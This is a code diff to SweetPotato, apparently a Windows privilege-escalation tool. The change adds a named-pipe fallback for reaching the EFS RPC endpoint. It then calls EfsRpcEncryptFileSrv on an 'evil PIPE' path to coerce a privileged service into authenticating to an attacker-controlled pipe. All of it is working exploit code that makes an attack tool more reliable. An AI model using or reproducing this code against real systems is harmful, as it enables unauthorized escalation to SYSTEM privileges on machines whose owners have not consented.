@@ -61,13 +61,39 @@ namespace SweetPotato {
             string targetPipe = string.Format($"\\\\localhost/pipe/{pipeName}/\\{pipeName}\\{pipeName}");
 
             Client c = new Client();
-            c.Connect();
 
-            Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");
+            try
+            {
+                c.Connect();
+            }
+            catch (Exception)
+            {
+                Console.WriteLine($"[-] Failed to connect to RPC endpoint using ALPC transport, trying named pipes instead...");
+            }
 
-            c.EfsRpcEncryptFileSrv(targetPipe);
-            // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112
+            if (c.Connected == false)
+            {
+                try
+                {
+                    NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity trsec = new NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity();
+                    trsec.AuthenticationLevel = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationLevel.PacketPrivacy;
+                    trsec.AuthenticationType = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationType.Negotiate;
 
+                    c.Connect("ncacn_np", "\\pipe\\efsrpc", "localhost", trsec);
+                }
+                catch (Exception)
+                {
+                    Console.WriteLine($"[-] Failed to connect to RPC endpoint using named pipes transport.");
+                }
+            }
+
+            if (c.Connected)
+            {
+                Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");
+
+                c.EfsRpcEncryptFileSrv(targetPipe);
+                // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112
+            }
         }
     }
 }
